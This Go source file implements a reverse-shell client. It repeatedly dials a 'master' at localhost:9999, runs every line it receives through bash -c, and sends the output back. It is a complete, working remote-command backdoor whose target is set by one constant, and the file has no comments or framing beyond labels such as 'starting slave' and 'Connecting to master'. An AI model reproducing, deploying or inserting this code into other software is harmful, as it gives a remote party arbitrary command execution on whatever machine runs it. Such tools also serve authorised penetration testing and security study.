package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net"
	"os/exec"
	"strings"
	"time"
)

const (
	sysShell  = "bash"
	addr      = "localhost:9999"
	tryPeriod = 5
)

//
//Execute bash commands...
func shellOut(command string) string {
	var stdout bytes.Buffer
	//var stderr bytes.Buffer
	cmd := exec.Command(sysShell, "-c", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	if err != nil {
		fmt.Println("can't run command", err)
		return fmt.Sprintf("can't run command: %s", err.Error())
	}
	return stdout.String()
}

func main() {

	for {
		//Starting slave...
		fmt.Println("starting slave...")
		//Connecting to master...
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			// Wait 5 sec before next try
			time.Sleep(tryPeriod * time.Second)
			continue
		}
		scanner := bufio.NewScanner(conn)
		//Scanning for commands...
		for scanner.Scan() {
			cmd := scanner.Text()
			resp := shellOut(cmd)
			rr := strings.NewReader(resp + "\r")
			//Returning cmd to master...
			_, err = io.Copy(conn, rr)
			if err != nil {
				continue
			}
		}
		conn.Close()
	}
}
